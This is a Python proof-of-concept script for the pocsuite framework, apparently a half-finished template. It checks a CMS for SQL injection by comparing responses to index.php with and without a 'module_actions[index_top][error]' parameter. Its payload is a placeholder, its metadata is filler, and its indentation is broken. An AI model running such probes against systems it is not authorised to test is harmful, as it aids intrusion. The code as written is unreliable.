#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    vulID = '912'  # ssvid
    version = '1'
    author = ['lowkey']
    vulDate = '2016-05-16'
    createDate = '2016-05-16'
    updateDate = '2016-05-16'
    references = ['http://www.sebug.net']
    name = 'SQLI'
	appPowerLink = 'https://www.google.com'
    appName = 'cms'
    appVersion = '1.1.3'
    vulType = 'Multi'
    desc = '''
		author = lowkey
	'''
	samples = ['https://www.google.com']

    def _verify(self):
        return self._attack()

    def _attack(self):
        result = {}
		payload = 'select into outfile ****'
		#get
        vul_url = '{url}/index.php'.format(url = self.url)
        res1 = req.get(url = vul_url, headers = self.headers, timeout = 10)

        vul_url2 = vul_url + u'?module_actions[index_top][error]'
        res2 = req.get(url = vul_url2, headers = self.headers, timeout = 10)

		#post modify it when neccessary

		#vul_url = '{url}/index.php'.format(url = self.url)
		#data = {
		#	'username' : 'haha',
		#	'password' : 'pass',
		#	'payload' : 'pay'
		#}
		#res1 = req.post(url = vul_url, data = data, headers = self.headers, timeout = 10)
		



		#check and capture the flag
        if res1 and res2:
            if res1 != res2: 
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vul_url2
                result['VerifyInfo']['Postdata'] = 'module_actions[index_top][error]'
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

